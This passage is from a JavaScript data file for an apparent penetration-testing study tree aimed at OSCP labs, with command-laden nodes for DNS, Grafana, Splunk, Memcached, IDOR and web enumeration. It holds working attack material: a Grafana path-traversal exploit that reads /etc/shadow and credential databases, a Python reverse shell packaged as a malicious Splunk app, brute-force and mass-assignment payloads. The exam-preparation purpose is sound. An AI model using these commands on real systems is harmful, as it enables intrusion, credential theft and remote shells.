      { label: "Blind XXE confirmed — need more enumeration", next: "web_fuzz_deep" },
      { label: "Got /etc/passwd — crack hashes", next: "hashcrack" },
    ],
  },

  dns_enum: {
    phase: "RECON",
    title: "DNS (53)",
    body: "DNS zone transfers dump the entire domain map — every host, IP, subdomain. Even without zone transfer, brute-forcing reveals hidden internal hosts to pivot to.",
    cmd: `nmap -p 53 -sV --script dns-zone-transfer $ip
nmap -p 53 --script dns-brute --script-args dns-brute.domain=target.com $ip

# Zone transfer — often misconfigured on internal DNS
dig axfr target.com @$ip
dig axfr @$ip target.com
host -l target.com $ip
dnsrecon -d target.com -t axfr

# Standard enumeration
dig @$ip target.com any        # All records
dig @$ip target.com ns         # Name servers
dig @$ip target.com mx         # Mail servers
dig @$ip target.com txt        # TXT/SPF records (username hints)
nslookup -type=any target.com $ip

# Subdomain brute force
dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d target.com -r $ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Reverse DNS (find hosts on subnet)
dnsrecon -r 192.168.1.0/24 -n $ip
for i in $(seq 1 254); do host 192.168.1.$i $ip 2>/dev/null | grep "domain name"; done

# Add discovered hosts to /etc/hosts
echo "$ip hostname.target.com" >> /etc/hosts`,
    warn: "Zone transfer (AXFR) works when DNS server is misconfigured to allow any client. Common on internal networks. Always try it — it takes one command.",
    choices: [
      { label: "Zone transfer worked — full host list", next: "targeted_scan" },
      { label: "Found subdomains — add to /etc/hosts", next: "web_enum" },
      { label: "Found internal hostnames — pivot target", next: "pivot_start" },
    ],
  },

  grafana: {
    phase: "WEB",
    title: "Grafana (3000)",
    body: "Grafana shows up constantly on practice machines. CVE-2021-43798 is unauthenticated path traversal — grab the database and extract admin credentials from it.",
    cmd: `# ── STEP 1: VERSION CHECK ─────────────────────────────
curl -s http://$ip:3000/api/health
# {"version":"8.3.0",...}  ← leaks exact version
# Also visible on login page source
# CVE-2021-43798 affects Grafana <= 8.3.0

# ── STEP 2: TRY DEFAULT CREDS FIRST ──────────────────
# admin:admin  admin:password  admin:grafana
# (fastest path if not patched)

# ── STEP 3: CVE-2021-43798 — PATH TRAVERSAL ──────────
# Unauthenticated — grabs SQLite database
curl --path-as-is -s \
  "http://$ip:3000/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" \
  -o grafana.db

# If alertlist fails try other installed plugins:
for plugin in dashboard graph table text stat gauge barchart timeseries; do
  curl -s --path-as-is "http://$ip:3000/public/plugins/$plugin/../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
  file grafana.db | grep -q SQLite && echo "SUCCESS: $plugin" && break
done

# Read any file (not just the DB):
curl --path-as-is "http://$ip:3000/public/plugins/alertlist/../../../../../../../../../etc/passwd"
curl --path-as-is "http://$ip:3000/public/plugins/alertlist/../../../../../../../../../etc/shadow"

# ── STEP 4: EXTRACT FROM DATABASE ────────────────────
sqlite3 grafana.db "SELECT login,password,salt FROM user;"
sqlite3 grafana.db ".tables"   # see all tables
sqlite3 grafana.db "SELECT * FROM data_source;"   # datasource creds!

# ── STEP 5: OPEN DB AND LOOK THROUGH EVERYTHING ──────
# Don't just run one query — browse the whole database
sqlite3 grafana.db ".tables"
sqlite3 grafana.db "SELECT * FROM data_source;"
# secure_json_data column contains AES-encrypted passwords

# strings the raw file too — blobs sometimes visible
strings grafana.db | grep -i "pass\|secret\|key\|token"

# ── STEP 5A: DECRYPT DATASOURCE PASSWORD (DO THIS FIRST) ─
# Datasource passwords = AES encrypted, NOT bcrypt
# Admins often reuse their system account password here
# Prometheus, MySQL, PostgreSQL datasources all store creds this way
# Decrypts INSTANTLY — do this before attempting to crack anything

git clone https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798.git
cd Grafana-Decryptor-for-CVE-2021-43798
python3 decrypt.py
# Paste the encrypted blob from secure_json_data → get plaintext
# Lab result: anBneWFN... → SuperSecureP@ssw0rd (sysadmin SSH cred)

# ── STEP 5B: CRACK BCRYPT HASHES (last resort, slow) ─
# User table passwords = bcrypt — often NOT valid system accounts
# Try cracking but don't count on it
sqlite3 grafana.db "SELECT login,password FROM user;"
hashcat -m 3200 grafana_hashes.txt /usr/share/wordlists/rockyou.txt
# github.com/iamaldi/grafana2hashcat — converts format for hashcat

# ── STEP 6: POST-LOGIN ENUM ───────────────────────────
# Configuration > Data Sources — check all stored creds
curl -u admin:password http://$ip:3000/api/datasources
curl -u admin:password http://$ip:3000/api/users
curl -u admin:password http://$ip:3000/api/org/users`,
    warn: "The user table bcrypt hash is often a rabbit hole — slow to crack and may not even be a valid system account. Open the DB and look through EVERYTHING manually. The data_source table contains backend service credentials (Prometheus, MySQL, etc) encrypted with AES not bcrypt — they decrypt instantly. Admins frequently reuse their system account password as the datasource credential. Lab validated: Fanatastic (PG Practice) — user hash was useless, datasource password was the system SSH cred.",
    choices: [
      { label: "Got datasource plaintext password", next: "creds_found" },
      { label: "Cracked bcrypt hash", next: "creds_found" },
      { label: "Default creds worked", next: "creds_found" },
      { label: "Also have Prometheus (9090) — check targets", next: "other_services" },
    ],
  },

  splunkd: {
    phase: "WEB",
    title: "Splunkd (8089/8000)",
    body: "Splunk = instant RCE if you have admin creds. Create a malicious app (Python script in a .tar.gz) and upload via the package manager. Port 8089 is the API, 8000 is the web UI.",
    cmd: `nmap -p 8000,8089 -sV $ip
curl -k https://$ip:8089/services      # API info
curl -k -u admin:changeme https://$ip:8089/services/server/info  # Version

# Default creds: admin:changeme  admin:password  admin:admin

# CVE-2023-46214 — XSLT injection (Splunk < 9.1.2) — check version

# RCE via malicious Splunk app (requires admin)
# Create the app structure:
mkdir -p splunk_shell/bin
cat > splunk_shell/bin/run.py << 'PYEOF'
import sys,socket,os,pty
s=socket.socket()
s.connect(("LHOST",LPORT))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
PYEOF

cat > splunk_shell/default/inputs.conf << 'CONFEOF'
[script://./bin/run.py]
disabled = false
interval = 10
sourcetype = test
CONFEOF

tar -czf splunk_shell.tar.gz splunk_shell/

# Upload via web UI: Apps > Manage Apps > Install app from file
# OR via API:
curl -k -u admin:changeme https://$ip:8089/services/apps/local \
  -F "name=splunk_shell" \
  -F "filename=true" \
  -F "appfile=@splunk_shell.tar.gz"

# Brute force Splunk login
hydra -l admin -P rockyou.txt $ip http-post-form \
  "/en-US/account/login:username=^USER^&password=^PASS^&return_to=%2Fen-US%2F:Invalid"`,
    warn: "On Windows, Splunk runs as SYSTEM by default — instant privilege escalation. On Linux, check the splunk user's sudo rights.",
    choices: [
      { label: "Got admin — uploaded malicious app = shell", next: "shell_upgrade" },
      { label: "Brute forced creds", next: "creds_found" },
      { label: "Need to escalate — Splunk runs as SYSTEM", next: "got_root_windows" },
    ],
  },

  memcached: {
    phase: "RECON",
    title: "Memcached (11211)",
    body: "Memcached has no authentication. Dump all keys and values — it caches session tokens, credentials, and application data in plaintext.",
    cmd: `nmap -p 11211 -sV --script memcached-info $ip
nc -vn $ip 11211

# Dump all cached data
# Step 1: Get slab IDs
echo "stats slabs" | nc -q 1 $ip 11211

# Step 2: Get keys from each slab (replace N with slab number)
echo "stats cachedump N 0" | nc -q 1 $ip 11211

# Step 3: Get value for each key
echo "get <keyname>" | nc -q 1 $ip 11211

# Automated dump script
python3 -c "
import socket
s = socket.socket()
s.connect(('$ip', 11211))
s.send(b'stats slabs\r\n')
slabs = s.recv(4096).decode()
print('SLABS:', slabs[:500])
s.send(b'stats cachedump 1 0\r\n')
keys = s.recv(4096).decode()
print('KEYS:', keys)
for line in keys.split('\n'):
    if line.startswith('ITEM'):
        key = line.split()[1]
        s.send(f'get {key}\r\n'.encode())
        print(s.recv(4096).decode())
s.close()
"

# Quick version/stats
echo "version" | nc -q 1 $ip 11211
echo "stats" | nc -q 1 $ip 11211`,
    warn: "Memcached data is application-specific. Look for session tokens (can be used for auth bypass), user objects, and any serialized data.",
    choices: [
      { label: "Found session tokens / creds in cache", next: "creds_found" },
      { label: "Found serialized objects — check for deserialization", next: "web_fuzz_deep" },
      { label: "Nothing useful", next: "unknown_service" },
    ],
  },

  idor: {
    phase: "WEB",
    title: "IDOR — Insecure Direct Object Reference",
    body: "IDOR = change an ID in a request to access another user's data or escalate to admin. Look for numeric IDs in URLs, API responses, and cookies. Most useful when you have a low-priv account and need admin access.",
    cmd: `# Identify direct references
# URL params:   /user?id=123   /api/document?doc_id=456
# Path params:  /user/123/profile   /api/orders/789
# POST bodies:  {"user_id": 123}
# Cookies:      user_id=123  (decode base64 if encoded)
# Headers:      X-User-ID: 123

# Basic IDOR test — increment/decrement IDs
# Your account: /api/user/123
# Try:          /api/user/1  (admin?)
#               /api/user/124  (next user)
#               /api/user/0   /api/user/-1

# Horizontal priv esc (access other users' data)
curl -H "Cookie: session=YOURS" http://$ip/api/user/124
curl -H "Cookie: session=YOURS" http://$ip/api/orders/1

# Vertical priv esc (escalate to admin)
# Look for role/admin fields in responses
# Try changing: {"user_id":123,"role":"admin"}

# Mass assignment — add privileged fields to POST
POST /api/profile
{"name":"attacker","email":"x@x.com","is_admin":true,"role":"admin"}

# UUID/GUID instead of sequential IDs?
# Try:  /api/user/00000000-0000-0000-0000-000000000001  (admin UUID)
# Or:   find user IDs from public endpoints (profile pages, comments)

# Burp automation
# Use Intruder on the ID parameter
# Payload: sequential numbers 1-1000
# Grep for: admin, sensitive data, other usernames

# Check indirect references too:
# /download?file=report.pdf  ->  /download?file=../../../etc/passwd
# (this becomes path traversal/LFI — check lfi node)`,
    warn: "IDOR is most powerful when combined with account registration. Create an account, note your user ID, then probe adjacent IDs and admin endpoints.",
    choices: [
      { label: "Got admin access via IDOR", next: "web_fuzz_deep" },
      { label: "IDOR gave creds / sensitive data", next: "creds_found" },
      { label: "File reference IDOR — try path traversal", next: "lfi" },
    ],
  },

  full_portscan: {
    phase: "RECON",
    title: "Full TCP Scan",
    body: "Run all 65535 ports in the background while you start UDP in parallel. Never skip this — services on high ports get people caught out.",
    cmd: `# -- Rustscan (faster — labs) --------------------------
ulimit -n 5000
rustscan -a $ip --ulimit 5000 -- -sV -sC -oN targeted.txt
# Scans all ports in seconds, hands open ports to nmap automatically
# The -- passes remaining args directly to nmap

# -- Nmap (exam-safe, always works) --------------------
# Full TCP (background it)
nmap -p- --min-rate 5000 -T4 $ip -oN allports.txt

# UDP top 20 (background)
sudo nmap -sU --top-ports 20 $ip -oN udp.txt &

# HTTP methods check while you wait
nmap -p80,443 --script=http-methods $ip \\
  --script-args http-methods.url-path='/'`,
    warn: "Rustscan is faster but verify it's on the allowed tools list before exam day — OffSec's policy updates. When in doubt on exam day, use nmap. In labs, rustscan + ulimit 5000 is the move.",
    choices: [
      { label: "Scan complete — run targeted scan on open ports", next: "targeted_scan" },
    ],
  },

  targeted_scan: {
    phase: "RECON",
    title: "Targeted Service Scan",
    body: "Run scripts and version detection only on discovered ports. This is your core recon. Read every line of output. Then run per-service NSE for each open port.",
    cmd: `# -- Step 1: targeted scan on open ports ---------------
nmap -p <PORTS> -sC -sV -O $ip -oN targeted.txt

# -- Step 2: per-service NSE (run only for open ports) --

# HTTP / HTTPS (80, 443, 8080, 8443)
nmap -Pn -sV -p 80,443 \
  "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" \
  -oN nse_http.txt $ip

# SMB (445)
nmap -Pn -sV -p 445 \
  "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" \
  --script-args=unsafe=1 -oN nse_smb.txt $ip

# FTP (21)
nmap -Pn -sV -p 21 \
  --script=banner,ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor \
  -oN nse_ftp.txt $ip

# SSH (22)
nmap -Pn -sV -p 22 \
  --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods \
  -oN nse_ssh.txt $ip

# RPC (111)
nmap -Pn -sV -p 111 \
  --script=banner,msrpc-enum,rpc-grind,rpcinfo \
  -oN nse_rpc.txt $ip

# SMTP (25)
nmap -Pn -sV -p 25 \
  "--script=banner,(smtp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" \
  -oN nse_smtp.txt $ip

# DNS (53 UDP)
sudo nmap -Pn -sU -sV -p 53 \
  "--script=banner,(dns* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" \
  -oN nse_dns.txt $ip

# SNMP (161 UDP)
sudo nmap -sU -sV -p 161 \
  --script=snmp-info,snmp-sysdescr,snmp-processes,snmp-interfaces \
  -oN nse_snmp.txt $ip

# -- Step 3: vuln scan after reading service output -----
nmap -sV -p <PORTS> --script vuln $ip -oN nse_vuln.txt`,
    warn: "Run per-service NSE only for ports that are actually open. The vuln category is noisy and slow — save it for after you have read the service output and identified candidates. The smb* scripts with unsafe=1 can crash unstable targets.",
    choices: [
      { label: "Help me read and prioritize this output", next: "analyze_output" },
      { label: "Web (80 / 443 / 8080 / 8443)", next: "web_enum" },
      { label: "SMB (139 / 445)", next: "smb_enum" },
      { label: "FTP (21)", next: "ftp_enum" },
      { label: "SSH only (22)", next: "ssh_only" },
      { label: "RDP (3389)", next: "rdp" },
      { label: "WinRM (5985 / 5986)", next: "winrm_access" },
      { label: "SNMP / DNS / LDAP / RPC", next: "other_services" },
      { label: "Active Directory environment", next: "ad_start" },
      { label: "Unknown service / unusual port", next: "unknown_service" },
      { label: "Multiple internal subnets visible", next: "pivot_start" },
    ],
  },


  // ==========================================
  //  ANALYSIS — READ BEFORE YOU ATTACK
  // ==========================================

  analyze_output: {
    phase: "ANALYSIS",
    title: "Read the Scan — Before You Attack",
    body: "Most people skip this step. They see port 80 and jump to web_enum. Slow down. Every line of nmap output is signal. Read it as a complete picture before you choose your attack path.",
    cmd: `# Print your targeted scan output
cat targeted.txt

# -- WHAT TO LOOK FOR ---------------------
# 1. SERVICE VERSIONS — are any outdated?
#    Apache 2.4.49, OpenSSH 7.2, Samba 3.x = immediate CVE candidates
#    searchsploit [service] [version]

# 2. OS FINGERPRINT — Linux or Windows?
#    Linux: privesc via sudo/SUID/cron
#    Windows: privesc via tokens/services/registry
#    OS tells you which post-exploit branch you will take

# 3. PORT COMBINATIONS — what does the full picture say?
#    80 + 445 + 5985     = Windows web server, likely AD-adjacent
#    21 + 22 + 80        = Linux, FTP may feed webroot
#    80 + 3306           = web + DB, SQLi → direct DB access
#    445 + 88 + 389      = Domain Controller
#    8080 + 8009         = Tomcat (AJP connector — Ghostcat)
#    3000               = Grafana
#    6379               = Redis (likely unauthenticated)
#    27017              = MongoDB (likely unauthenticated)

# 4. NSE SCRIPT OUTPUT — read it all
#    smb-security-mode: message_signing disabled = relay possible
#    http-title: [title] tells you what the app is
#    ssl-cert: common name reveals internal hostnames
#    ssh-hostkey: algorithm age signals OS vintage

# 5. FILTERED vs CLOSED
#    Closed = port exists, nothing listening
#    Filtered = firewall present — UDP or retry later`,
    warn: "SSL certificates contain hostnames. Add every CN and SAN you find to /etc/hosts — they often resolve to different virtual hosts that expose separate attack surfaces.",
    choices: [
      { label: "Multiple services — help me prioritize", next: "analyze_multiservice" },
      { label: "I see a version number — let me assess it", next: "analyze_versions" },
      { label: "Output looks ambiguous — nothing obvious", next: "analyze_ambiguous" },
      { label: "Looks like a Domain Controller", next: "analyze_dc" },
      { label: "I know what I am looking at — go attack", next: "targeted_scan" },
    ],
  },

  analyze_multiservice: {
    phase: "ANALYSIS",
    title: "Multiple Services — Priority Order",
    body: "Multiple attack surfaces on one box is common. The mistake is jumping to the most familiar service rather than the highest-value one. Use this priority framework.",
    cmd: `# -- ATTACK SURFACE PRIORITY -------------
# Rank your open services using this logic:

# TIER 1 — Exploit immediately if present
#   Unauthenticated RCE (Redis, MongoDB, Elasticsearch no-auth)
#   Known unpatched CVE with public exploit (check versions)
#   Anonymous FTP write access to webroot
#   SMB without signing + relay opportunity

# TIER 2 — High value, enumerate thoroughly first
#   Web application (parameters, login, upload)
#   SMB shares (anonymous read = credential hunting)
#   MSSQL/MySQL (creds from elsewhere may give xp_cmdshell)

# TIER 3 — Useful after initial access
#   SSH (you need creds first — brute only as last resort)
#   RDP (same — creds needed, expensive to brute)
#   WinRM (same — tool for lateral movement, not initial access)

# -- COMMON WINNING COMBINATIONS ----------
# FTP (anon) + HTTP:
#   Download FTP → find creds → login web
#   OR upload webshell via FTP if FTP root = webroot

# SMB + HTTP:
#   Spider SMB shares first — credentials often in scripts/configs
#   Use found creds on web login

# HTTP + SSH:
#   Exploit web first → get shell as www-data
#   Find SSH key in webroot or /home → pivot to user

# HTTP + DB (3306/5432/1433/27017):
#   Web SQLi → direct DB shell
#   OR find DB creds in web config → connect directly

# -- YOUR CURRENT SURFACE -----------------
# List your ports: [fill in]
# Highest tier present: [fill in]
# Starting with: [fill in]`,
    warn: "If you see Redis (6379) or MongoDB (27017) open — test unauthenticated access FIRST before anything else. These are often instant shells with zero effort.",
    choices: [
      { label: "Web is highest value — enumerate it", next: "web_enum" },
      { label: "SMB first — shares may have credentials", next: "smb_enum" },
      { label: "Unauthenticated DB/service — instant win", next: "unknown_service" },
      { label: "FTP + web combination", next: "ftp_enum" },
      { label: "Back to full output analysis", next: "analyze_output" },
    ],
  },

  analyze_versions: {
    phase: "ANALYSIS",
    title: "Version Analysis — Is This Exploitable?",
    body: "A version number is a gift. Most people searchsploit it once and move on. Do it properly — cross-reference multiple sources, understand what the exploit actually does before you run it.",
    cmd: `# -- SEARCHSPLOIT -------------------------
searchsploit [service] [version]
searchsploit -x [exploit/path]   # read before running

# -- CROSS-REFERENCE ----------------------
# NVD: https://nvd.nist.gov/vuln/search
# ExploitDB: https://www.exploit-db.com
# GitHub: site:github.com [service] [version] exploit
# PacketStorm: packetstormsecurity.com

# -- VERSION READING TIPS ------------------
# nmap shows: Apache httpd 2.4.49
#   searchsploit apache 2.4.49   → CVE-2021-41773 path traversal/RCE
#
# nmap shows: OpenSSH 7.2p2
#   searchsploit openssh 7.2     → user enumeration (less useful)
#   but 7.2 on Ubuntu = Ubuntu 16.04 = kernel exploit candidates
#
# nmap shows: Samba 4.x.x
#   check if < 4.6.4 → SambaCry (CVE-2017-7494)
#   check if 3.x → very old, many exploits
#
# nmap shows: Microsoft IIS 10.0
#   IIS 10 = Windows Server 2016/2019 or Windows 10
#   look for WebDAV, PUT upload, ASPX execution

# -- EXPLOIT QUALITY CHECK ----------------
# Before running any exploit ask:
# 1. Does the version match EXACTLY? (2.4.49 ≠ 2.4.50)
# 2. Is there a Metasploit module? (fastest to test)
# 3. Is the PoC Python 2 or 3? (check shebang line)
# 4. Does it need modification? (LHOST/LPORT/target URL)
# 5. What does success look like? (RCE? file read? DoS?)
# 6. Will it crash the service? (avoid on OSCP — limited attempts)`,
    warn: "Version numbers in nmap are detected by banners — services can lie or be misconfigured. If searchsploit returns nothing, try one version up and one version down. Banners are not always accurate.",
    choices: [
      { label: "Found a CVE — test it", next: "searchsploit_web" },
      { label: "No CVE — back to attack surface priority", next: "analyze_multiservice" },
      { label: "Web version — enumerate the app instead", next: "web_enum" },
      { label: "SMB version — check MS17-010", next: "smb_enum" },
    ],
  },

  analyze_ambiguous: {
    phase: "ANALYSIS",
    title: "Ambiguous Output — Reading the Signal",
    body: "Nothing obvious in the scan. This is not the same as nothing there. Ambiguous output has a specific set of follow-up moves. Work through them systematically before concluding the surface is locked.",
    cmd: `# -- WHEN NMAP OUTPUT LOOKS THIN ----------

# 1. DID YOU SCAN ALL PORTS?
nmap -p- --min-rate 5000 $ip -oN allports.txt
# Services on high ports (8080, 8443, 8888, 9090, 10000) are common

# 2. UDP — HAVE YOU CHECKED IT?
sudo nmap -sU --top-ports 100 $ip -oN udp.txt
# SNMP (161), TFTP (69), DNS (53) often only on UDP
# SNMP especially — community string "public" = info dump

# 3. WEB — IS THERE A VIRTUAL HOST?
curl -sv http://$ip   # check the response title
# If title shows a domain name: add to /etc/hosts and revisit
# If 400 Bad Request on HTTPS: server requires SNI — use -k and hostname

# 4. ARE YOU READING 403 CORRECTLY?
# 403 Forbidden = the resource EXISTS but you lack permission
# 403 is NOT the same as 404. It is a door that is locked, not absent.
# Try: different HTTP method (OPTIONS, PUT, PATCH)
# Try: path traversal (/../admin, /./admin)
# Try: different User-Agent (Googlebot, curl)
# Try: add trailing slash (/admin/)

# 5. RESPONSE SIZE VARIATION
# Two 403s with different response sizes = different content behind them
# Feroxbuster: filter by size to find anomalies
feroxbuster -u http://$ip --filter-size [common_size]

# 6. NOTHING AT ALL?
# Check if the service is actually up
nc -nv $ip [port]
telnet $ip [port]
# Sometimes nmap misfires on rate-limited or filtered hosts`,
    warn: "A wall of 403s from feroxbuster is not nothing — it means content exists. The question is what HTTP method, header, or path variation gets you past the filter.",
    choices: [
      { label: "Found content on high port", next: "web_enum" },
      { label: "SNMP is open — enumerate it", next: "other_services" },
      { label: "Virtual host discovered", next: "subdomain_enum" },
      { label: "403s everywhere — dig into them", next: "web_fuzz_deep" },
      { label: "Genuinely nothing — try UDP fully", next: "analyze_output" },
      { label: "I think I am in a rabbit hole", next: "mindset_rabbithole" },
    ],
  },

  analyze_dc: {
    phase: "ANALYSIS",
    title: "Reading a Domain Controller",
    body: "A DC has a signature port combination. If you see it, you are in an AD environment. The attack path is completely different from a standalone machine — do not treat it like a normal box.",
    cmd: `# -- DC SIGNATURE PORTS -------------------
# 53   DNS       — zone transfer attempt first
# 88   Kerberos  — AS-REP roast, Kerberoast
# 135  MSRPC
# 139  NetBIOS
# 389  LDAP      — anonymous bind? enumerate users
# 445  SMB       — shares, relay, eternal blue
# 464  Kpasswd
# 593  RPC over HTTP
# 636  LDAPS
# 3268 Global Catalog LDAP
# 3269 Global Catalog LDAPS
# 5985 WinRM     — if you get DA creds, shell here

# -- FIRST MOVES ON A DC ------------------
# 1. Get the domain name
nmap -p 389 --script ldap-rootdse $ip
crackmapexec smb $ip   # shows domain, hostname, OS

# 2. DNS zone transfer
dig axfr [domain] @$ip
# If it works: full internal host map

# 3. LDAP anonymous bind
ldapsearch -x -h $ip -b "dc=[domain],dc=com"
# If it works: full user/group list without creds

# 4. SMB null session
crackmapexec smb $ip -u "" -p "" --shares
enum4linux-ng $ip

# 5. Do NOT try to brute force Kerberos
# Account lockout is real on DCs
# Use AS-REP roast (no creds needed) and Kerberoast (creds needed)

# -- KEY DECISION -------------------------
# Do you have ANY credentials yet?
# No creds: AS-REP roast, LDAP anon, DNS zone transfer, Responder
# Have creds: BloodHound immediately, then follow the path`,
    warn: "Never attack the DC directly in an OSCP AD set — you reach it last, through the chain. The DC is the destination, not the entry point. Start with the workstation or member server.",
    choices: [
      { label: "No creds yet — AS-REP roast first", next: "asrep_roast" },
      { label: "Have creds — run BloodHound", next: "bloodhound" },
      { label: "Run Responder to capture hashes", next: "responder" },
      { label: "Full AD methodology", next: "ad_start" },
    ],
  },

  // ==========================================
  //  WEB
  // ==========================================
  web_enum: {
    phase: "WEB",
    title: "Web Enumeration",
    body: "Start fast with raft, escalate to dirbuster if stuck. feroxbuster is recursive by default — it finds a dir then automatically fuzzes inside it. No /FUZZ needed, no trailing slash needed. Two separate passes: dirs first, then files.",
    cmd: `# ── HOW FEROXBUSTER WORKS ────────────────────────────
# feroxbuster -u http://$ip  ← no trailing slash needed, no /FUZZ
# Recursive by default — finds /admin, auto-scans /admin/
# -d controls depth (default: 4)
# -n disables recursion for flat scan only
# -x appends extensions to every word — use with files wordlist
# --extract-links crawls response bodies for linked content too
# --filter-similar-to filters wildcard responses (box returns 200 for everything)

# ── WORDLIST DECISION TREE ────────────────────────────
# raft-medium-directories (30k)  → dirs pass, always start here
# raft-medium-files (real names) → files pass, different wordlist
# directory-list-2.3-medium (220k) → escalate if raft finds nothing
# dirbuster lists = dirs ONLY, no extensions — never use for files

# ── PASS 1: DIRECTORIES ───────────────────────────────
# raft-medium-directories = directory names without extensions
# feroxbuster recurses into found dirs automatically
feroxbuster -u http://$ip \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -d 3 --extract-links -o ferox_dirs_raft.txt

# HTTPS target (self-signed cert)
feroxbuster -u https://$ip -k \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -d 3 --extract-links -o ferox_dirs_raft.txt

# Wildcard filter — if box returns 200 for everything
# First get a wildcard URL to filter against:
feroxbuster -u http://$ip \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  --filter-similar-to http://$ip/doesnotexist123 \\
  -d 3 -o ferox_dirs_raft.txt

# ── PASS 2: FILES ─────────────────────────────────────
# raft-medium-files = actual filenames WITH extensions
# (config.php, index.bak, login.html etc)
feroxbuster -u http://$ip \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
  -d 3 -o ferox_files.txt

# ── PASS 3: TARGETED EXTENSIONS ON KNOWN DIR ─────────
# once Pass 1 finds /admin, run extensions against it specifically
feroxbuster -u http://$ip/FOUND_DIR \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
  -x php,html,txt,bak,old,zip -d 2 -o ferox_ext.txt

# ── PASS 4: ESCALATE — if raft found nothing ──────────
# directory-list-2.3-medium is 7x larger, pentest-derived
# finds CTF paths, legacy app dirs, obscure endpoints
feroxbuster -u http://$ip \\
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\
  -d 3 -o ferox_dirs_dirbuster.txt

# ── VHOST FUZZING ─────────────────────────────────────
# Virtual host enum — same IP, different Host header = different app
# Get baseline first (size of response with unknown host)
curl -s -H "Host: doesnotexist.example.com" http://$ip -o /dev/null -w "%{size_download}\n"

# ffuf vhost fuzz — filter baseline size
ffuf -u http://$ip \\
  -H "Host: FUZZ.$domain" \\
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
  -fs BASELINE_SIZE -o ffuf_vhosts.txt

# If domain unknown — try common patterns
ffuf -u http://$ip \\
  -H "Host: FUZZ" \\
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
  -fs BASELINE_SIZE

# gobuster vhost mode
gobuster vhost -u http://$ip \\
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
  --append-domain -t 40

# Add found vhosts to /etc/hosts then enumerate each
echo "$ip found.domain.com" | sudo tee -a /etc/hosts
feroxbuster -u http://found.domain.com \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -d 3 -o ferox_vhost.txt

# ── GOBUSTER — fast single-pass fallback ──────────────
gobuster dir -u http://$ip \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -t 40 -o gobuster_dirs.txt
gobuster dir -u http://$ip \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
  -t 40 -o gobuster_files.txt

# ── FFUF — fine-grained control ───────────────────────
curl http://$ip/doesnotexist123 -s -o /dev/null -w "%{size_download}\n"
ffuf -u http://$ip/FUZZ \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -mc 200,301,302,403 -fs BASELINE_SIZE -o ffuf_dirs.txt
ffuf -u http://$ip/FUZZ \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
  -mc 200,301,302 -fs BASELINE_SIZE -o ffuf_files.txt
# files in a known dir:
ffuf -u http://$ip/FOUND_DIR/FUZZ \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
  -mc 200,301,302 -fs BASELINE_SIZE

# ── TECH FINGERPRINT ──────────────────────────────────
whatweb http://$ip
curl -sv http://$ip 2>&1 | grep -i "server\\|x-powered\\|set-cookie\\|location"
curl http://$ip/robots.txt
curl http://$ip/sitemap.xml
# nikto is slow and noisy — background it or run last
nikto -h http://$ip -o nikto.txt &`,
    warn: "feroxbuster recurses automatically — no trailing slash or /FUZZ needed. If every path returns 200, use --filter-similar-to with a known-bad URL to filter wildcards. If raft finds nothing escalate to directory-list-2.3-medium — OSCP boxes frequently hide paths there. Vhost fuzzing is often the hidden path — always check when you have a domain name or SSL cert CN.",
    choices: [
      { label: "Found WordPress", next: "wordpress" },
      { label: "Found login page", next: "login_page" },
      { label: "Found file upload", next: "file_upload" },
      { label: "IIS server — ASPX shell path", next: "iis_aspx" },
      { label: "Jenkins on 8080/8443", next: "jenkins" },
      { label: "WebDAV enabled", next: "webdav" },
      { label: "Grafana on 3000", next: "grafana" },
      { label: "Splunk on 8000/8089", next: "splunkd" },
      { label: "URL has parameter (?id=1, ?page=, ?file=)", next: "param_found" },
      { label: "Found vhost / subdomain", next: "subdomain_enum" },
      { label: "Nothing obvious — fuzz deeper", next: "web_fuzz_deep" },
    ],
  },




  subdomain_enum: {
    phase: "WEB",
    title: "Subdomain Enumeration",
    body: "Subdomains often expose dev, admin, or internal panels. Always add discovered subs to /etc/hosts before testing.",
    cmd: `gobuster dns -d domain.org \\
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \\
  -t 30

ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \\
  -u http://FUZZ.domain.org -o subdomains.txt

# Add to /etc/hosts
echo "$ip sub.domain.org" >> /etc/hosts`,
    warn: "Verify every subdomain resolves to an in-scope IP before testing.",
    choices: [
      { label: "Found subdomain — enumerate it as new web target", next: "web_enum" },
      { label: "Nothing — keep fuzzing main host", next: "web_fuzz_deep" },
    ],
  },

  web_fuzz_deep: {
    phase: "WEB",
    title: "Deep Web Fuzzing",
    body: "Go wider and deeper. Parameter brute force, LFI testing, XSS, command injection wordlists. Use wfuzz for fine-grained control.",
    cmd: `# Parameter brute force
# XSStrike — advanced XSS scanner (Kali 2026.1)
